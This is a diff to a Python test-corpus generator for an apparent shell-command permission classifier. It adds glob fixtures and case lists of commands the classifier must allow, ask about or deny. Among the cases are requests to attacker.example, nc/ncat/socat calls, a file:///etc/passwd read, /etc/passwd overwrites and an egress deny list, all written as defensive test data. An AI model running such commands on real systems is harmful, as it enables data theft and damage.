@@ -1441,6 +1441,7 @@ def fixtures_root(tmp_path_factory: pytest.TempPathFactory) -> Path:
     build_recursive_rm_fixtures(root)
     build_bare_metadata_fixtures(root)
     build_curl_destination_fixtures(root)
+    build_glob_fixtures(root)
     build_git_workflow_fixtures(root)
     return root
 
@@ -1780,6 +1781,51 @@ def build_curl_destination_fixtures(root: Path) -> None:
     (repo / "allowed.txt").write_text("allowed\n", encoding="utf-8")
     os.symlink("../.git", safe / "alias")
     os.symlink("../../plain-repo", safe / "escape")
+
+
+def build_glob_fixtures(root: Path) -> None:
+    """Build the S2 glob-execution matcher fixtures.
+
+    The committed fixture tree cannot carry the shapes these rows need:
+    ``shutil.copytree`` follows symlinks and cannot copy a FIFO. The
+    directories are deterministic (fixed names and contents, no timestamps
+    or absolute paths in any recorded observation), so the corpus replays.
+
+    Layout:
+    ``glob-whitelist/ok`` — regular files, a literal subdirectory, and a
+    space-bearing name (positive admissions);
+    ``glob-whitelist/option-like`` — a plain file and a ``-x.txt`` match
+    (option-like and post-``--`` denials);
+    ``glob-whitelist/shapes`` — a directory, a FIFO, a symlinked operand, and
+    a symlinked component (static shape denials);
+    ``glob-whitelist/dot`` — a dot-leading file beside a visible one.
+    """
+    base = root / "glob-whitelist"
+    ok = base / "ok"
+    (ok / "sub").mkdir(parents=True, exist_ok=True)
+    (ok / "alpha.txt").write_text("alpha\n", encoding="utf-8")
+    (ok / "beta.txt").write_text("beta\n", encoding="utf-8")
+    (ok / "file.txt").write_text("file\n", encoding="utf-8")
+    (ok / "with space.txt").write_text("spaced\n", encoding="utf-8")
+    (ok / "sub" / "gamma.txt").write_text("gamma\n", encoding="utf-8")
+
+    option_like = base / "option-like"
+    option_like.mkdir(parents=True, exist_ok=True)
+    (option_like / "a.txt").write_text("a\n", encoding="utf-8")
+    (option_like / "-x.txt").write_text("dash\n", encoding="utf-8")
+
+    shapes = base / "shapes"
+    shapes.mkdir(parents=True, exist_ok=True)
+    (shapes / "beta.txt").write_text("beta\n", encoding="utf-8")
+    (shapes / "dir.txt").mkdir(exist_ok=True)
+    os.mkfifo(shapes / "pipe.fifo")
+    os.symlink("../ok/alpha.txt", shapes / "link.txt")
+    os.symlink("../ok", shapes / "linkdir")
+
+    dot = base / "dot"
+    dot.mkdir(parents=True, exist_ok=True)
+    (dot / ".hidden.txt").write_text("hidden\n", encoding="utf-8")
+    (dot / "visible.txt").write_text("visible\n", encoding="utf-8")
 
 
 def build_git_workflow_fixtures(root: Path) -> None:
@@ -4405,6 +4451,213 @@ PERMISSION_R16_CASES: list[dict[str, Any]] = [
 ]
 
 
+# S1: safe-pattern admissions. The positive rows are the new admissions — the
+# quoted/escaped `=` marker proven as one literal word and the
+# same-invocation `$?` probe as `<simple-command>; <status-command> $?`. Every
+# `$?` near-miss class (pipeline, conditional, assignment, redirect, wrapper,
+# subsequent command) stays denied, as does every KEEP-DENIED class and the
+# unquoted marker. The dangerous-git and hard-guard classes are unchanged and
+# a probe cannot launder one.
+PERMISSION_S1_CASES: list[dict[str, Any]] = [
+    # Positive admissions.
+    {"argv": [], "raw": "echo '=ls'"},
+    {"argv": [], "raw": "echo \\=ls"},
+    {"argv": [], "raw": "ls; echo $?"},
+    {"argv": [], "raw": "true; printf $?"},
+    # `$?` near-misses.
+    {"argv": [], "raw": "ls | echo $?"},
+    {"argv": [], "raw": "ls && echo $?"},
+    {"argv": [], "raw": "X=1; echo $?"},
+    {"argv": [], "raw": "ls > out.txt; echo $?"},
+    {"argv": [], "raw": "env ls; echo $?"},
+    {"argv": [], "raw": "ls; echo $?; id"},
+    # Equals-marker negatives: the unquoted live forms and a marker that can
+    # still expand past one word.
+    {"argv": [], "raw": "echo =ls"},
+    {"argv": [], "raw": "echo ===X==="},
+    {"argv": [], "raw": "echo '='*"},
+    {"argv": [], "raw": "echo =$(id)"},
+    # KEEP-DENIED classes.
+    {"argv": [], "raw": "echo $(id)"},
+    {"argv": [], "raw": "for i in 1 2; do echo $i; done"},
+    {"argv": [], "raw": "if true; then echo x; fi"},
+    {"argv": [], "raw": "echo $HOME"},
+    {"argv": [], "raw": "echo $((1+1))"},
+    {"argv": [], "raw": "x=1; echo $x"},
+    # Dangerous-git and hard-guard classes unchanged.
+    {"argv": [], "raw": "git reset --hard; echo $?", "cwd": "gw-clean"},
+    {"argv": [], "raw": "git push; echo $?", "cwd": "gw-published"},
+]
+
+
+# S2: glob execution binding. The positive rows are the admission boundary —
+# a standalone `cat`/`wc` with NO OPTIONS (an optional `--` terminator only)
+# and operands that are each literal or one single-component `*`/`?` glob
+# with a literal, authorized parent. Every row of the design's deny matrix
+# follows: brackets, `**`, braces, tilde, mixed quoting, no-match, option-like
+# results, a match beginning with `-` even after `--`, directories,
+# non-regular files, symlinks as operand and as component (static rejection),
+# and read-authority rejections. Resolution-only: the literal transport's
+# execution behavior is pinned by tests/tools/test_glob_execution_binding.py.
+PERMISSION_S2_CASES: list[dict[str, Any]] = [
+    # Positive admission boundary.
+    {"argv": [], "raw": "cat *.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat alpha.txt *.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat sub/*.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat ./sub/*.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat fi?e.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat -- *.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "wc *.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat *.txt", "cwd": "glob-whitelist/dot"},
+    # No options (a negative options case).
+    {"argv": [], "raw": "cat -n *.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "wc -l *.txt", "cwd": "glob-whitelist/ok"},
+    # Ineligible glob shapes.
+    {"argv": [], "raw": "cat [ab]*.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat **/*.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat {alpha,beta}.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat ~/*.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat '*'a*.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": 'cat "*.txt"', "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat su*/*.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat .*", "cwd": "glob-whitelist/dot"},
+    # No match, option-like results, and `-` matches after `--`.
+    {"argv": [], "raw": "cat *.nomatch", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat *.txt", "cwd": "glob-whitelist/option-like"},
+    {"argv": [], "raw": "cat -- *.txt", "cwd": "glob-whitelist/option-like"},
+    # Directories, non-regular files, symlinks (operand and component).
+    {"argv": [], "raw": "cat *ir.txt", "cwd": "glob-whitelist/shapes"},
+    {"argv": [], "raw": "cat *.fifo", "cwd": "glob-whitelist/shapes"},
+    {"argv": [], "raw": "cat link.txt *.txt", "cwd": "glob-whitelist/shapes"},
+    {"argv": [], "raw": "cat *link*", "cwd": "glob-whitelist/shapes"},
+    {"argv": [], "raw": "cat linkdir/*.txt", "cwd": "glob-whitelist/shapes"},
+    # Read authority, and the non-standalone shapes.
+    {"argv": [], "raw": "cat ../ok/*.txt", "cwd": "glob-whitelist/shapes"},
+    {"argv": [], "raw": "cat *.txt > out.txt", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat *.txt | wc -l", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat *.txt; echo $?", "cwd": "glob-whitelist/ok"},
+    # S1 seam: the same-invocation status probe keeps its shell execution
+    # (the behavioral row pins that the real status prints; these pin the
+    # admission under the new plumbing).
+    {"argv": [], "raw": "cat alpha.txt; echo $?", "cwd": "glob-whitelist/ok"},
+    {"argv": [], "raw": "cat missing.txt; echo $?", "cwd": "glob-whitelist/ok"},
+]
+
+
+# v0.7.0 S3: egress modeling for HTTPie's `http`, plus the retained denials.
+# The http grammar is POSITIONAL-ONLY and enumerated: `http [METHOD] URL
+# [ITEM...]` with a closed method set, a literal http(s) URL, and literal
+# request items (`name=value`, `name:=value`, `name==value`, `name:value`).
+# Rows appear in the order of the enumeration, one per admitted form, then the
+# ask-class destinations, the hard-denied spellings, the post-S3 egress-deny
+# list (one row each: the design's eight, nc/ncat/socat, httpie, wget2), the
+# wget2 gate spellings that the retained entry must keep denying, and the
+# ordering row proving local writes are gated before egress authority.
+#
+# A `name==value` item is spelled with explicit quotes: unquoted, the word's
+# `=value` suffix is zsh's magic-equals expansion, which the SHELL grammar
+# denies before the http grammar is consulted (a pre-existing denial, not an
+# S3 one; the quoted form is what the http grammar admits).
+PERMISSION_S3_CASES: list[dict[str, Any]] = [
+    # Admitted forms: bare request, method form, and the four literal item
+    # spellings.
+    {"argv": ["http", "http://localhost:8080/pubstatus"]},
+    {"argv": ["http", "GET", "http://127.0.0.1:8080/pubstatus"]},
+    {"argv": ["http", "DELETE", "http://[::1]:8080/item"]},
+    {"argv": ["http", "POST", "http://localhost:8080/api", "payload=1"]},
+    {"argv": ["http", "PUT", "http://localhost:8080/api", "payload:=7"]},
+    {"argv": [], "raw": "http http://localhost:8080/search 'q==term'"},
+    {"argv": ["http", "HEAD", "http://localhost:8080/", "Accept:application/json"]},
+    {"argv": ["http", "PATCH", "http://0.0.0.0:8080/item", "stat=updated"]},
+    {"argv": ["http", "https://localhost:8443/"]},
+    # A modeled wrapper re-analyzes the payload, so the http grammar applies.
+    {"argv": ["nice", "http", "http://localhost:8080/pubstatus"]},
+    # Ask-class: a destination the model can name but not prove loopback.
+    {"argv": ["http", "http://attacker.example/"]},
+    {"argv": ["http", "POST", "http://192.0.2.1/api", "payload=1"]},
+    {"argv": ["http", "localhost:8080/pubstatus"]},
+    {"argv": ["http", "example.com/api"]},
+    # The proxy binding composes for http as for the other modeled clients.
+    {
+        "argv": [
+            "HTTPS_PROXY=http://attacker.example:3128",
+            "http",
+            "http://localhost:8080/",
+        ]
+    },
+    # Hard-denied spellings: no option, no local-file item, no other scheme,
+    # no missing destination, no stray operand, and no startup-config
+    # indirection — no operation ID exists, so no grant can approve them.
+    {"argv": ["http", "--follow", "http://localhost:8080/"]},
+    {
+        "argv": [
+            "http",
+            "--proxy",
+            "http://attacker.example:3128",
+            "http://localhost:8080/",
+        ]
+    },
+    {"argv": ["http", "-o", "out.json", "http://localhost:8080/"]},
+    {"argv": ["http", "--session", "work", "http://localhost:8080/"]},
+    {"argv": ["http", "POST", "http://localhost:8080/", "field@upload.txt"]},
+    {"argv": ["http", "PUT", "http://localhost:8080/", "payload:=@data.json"]},
+    {"argv": ["http", "GET", "file:///etc/passwd"]},
+    {"argv": ["http"]},
+    {"argv": ["http", "http://localhost:8080/", "stray-operand"]},
+    {"argv": ["HTTPIE_CONFIG_DIR=cfg", "http", "http://localhost:8080/"]},
+    # The post-S3 egress-deny list, one row each: ssh/scp/rsync stay
+    # egress-denied so S4b's network.remote-exec path stays reachable.
+    {"argv": ["ssh", "host", "git push"]},
+    {"argv": ["scp", "file", "host:backup"]},
+    {"argv": ["rsync", "-a", "src/", "host:dst/"]},
+    {"argv": ["ftp", "host"]},
+    {"argv": ["telnet", "host"]},
+    {"argv": ["aria2c", "http://example.com/x"]},
+    {"argv": ["lftp", "host:backup"]},
+    {"argv": ["watch", "-n", "1", "git", "push"]},
+    {"argv": ["nc", "host", "1234"]},
+    {"argv": ["ncat", "host", "1234"]},
+    {"argv": ["socat", "-", "TCP:host:1234"]},
+    # httpie: the installed entry point is not confirmed to carry HTTPie's
+    # request grammar, so the entry stays.
+    {"argv": ["httpie", "GET", "https://example.com"]},
+    # wget2: the redirect-disable prerequisite for loopback auto-allow is not
+    # established, so the RETAINED denylist entry is what denies it — and the
+    # remaining gates with it.
+    {"argv": ["wget2", "http://127.0.0.1:8080/"]},
+    {"argv": ["wget2", "-r", "http://127.0.0.1:8080/pub/"]},
+    {"argv": ["wget2", "-i", "urls.txt", "http://127.0.0.1:8080/"]},
+    {"argv": ["wget2", "--config=cfg", "http://127.0.0.1:8080/"]},
+    {"argv": ["wget2", "-O", "../outside/report.html", "http://127.0.0.1:8080/"]},
+    # The FTP PASV residual is not inherited: an ftp:// operand is denied with
+    # the retained entry rather than riding a loopback auto-allow.
+    {"argv": ["wget2", "ftp://127.0.0.1/pub/file"]},
+    # Ordering: the redirect target is a LOCAL write, gated by the path layer
+    # before the egress flow is consulted (the denial names the path, not
+    # network.egress).
+    {"argv": [], "raw": "http http://attacker.example/ > /etc/passwd"},
+    {"argv": [], "raw": "wget -O /etc/passwd http://attacker.example/"},
+]
+
+
+# v0.7.0 HTTPS egress residual: HTTPie's `https` entry point is the same
+# request client with the https scheme defaulted. It has no documented,
+# corpus-tested grammar of its own — the `http` model admits only HTTPie's
+# request grammar — so under the same prerequisite rule that keeps wget2 and
+# httpie denied (no documented+corpus-testable grammar, so no modeling) it is
+# denied fail-closed. Grammar modeling is deferred to the v0.8.0 backlog.
+# The rows pin that the RETAINED denylist entry is what denies it: a plain
+# remote destination, a loopback destination (no auto-allow rides beside the
+# modeled `http`), an https-scheme destination, and a modeled wrapper that
+# re-analyzes the payload.
+PERMISSION_HTTPS_DENY_CASES: list[dict[str, Any]] = [
+    {"argv": ["https", "http://attacker.example/"]},
+    {"argv": ["https", "http://127.0.0.1:8080/"]},
+    {"argv": ["https", "https://example.com/api"]},
+    {"argv": ["nice", "https", "http://attacker.example/"]},
+]
+
+
 # A3: the runtime-aware divergence records for the checkout exemption. The
 # frozen pure classifier still classifies every exempt form as a dangerous
 # git operation, while the runtime resolver grants it on the clean
@@ -4602,6 +4855,14 @@ def build_family_entries(family: str, root: Path) -> list[dict[str, Any]]:
         for case in PERMISSION_R15_CASES:
             add(case, observe_permission(case, root))
         for case in PERMISSION_R16_CASES:
+            add(case, observe_permission(case, root))
+        for case in PERMISSION_S1_CASES:
+            add(case, observe_permission(case, root))
+        for case in PERMISSION_S2_CASES:
+            add(case, observe_permission(case, root))
+        for case in PERMISSION_S3_CASES:
+            add(case, observe_permission(case, root))
+        for case in PERMISSION_HTTPS_DENY_CASES:
             add(case, observe_permission(case, root))
     else:
         raise AssertionError(f"unknown corpus family: {family}")
@@ -5006,6 +5267,7 @@ def main(argv: list[str] | None = None) -> int:
         build_recursive_rm_fixtures(root)
         build_bare_metadata_fixtures(root)
         build_curl_destination_fixtures(root)
+        build_glob_fixtures(root)
         build_git_workflow_fixtures(root)
         entries = build_entries(root)
     text = serialize_entries(entries)
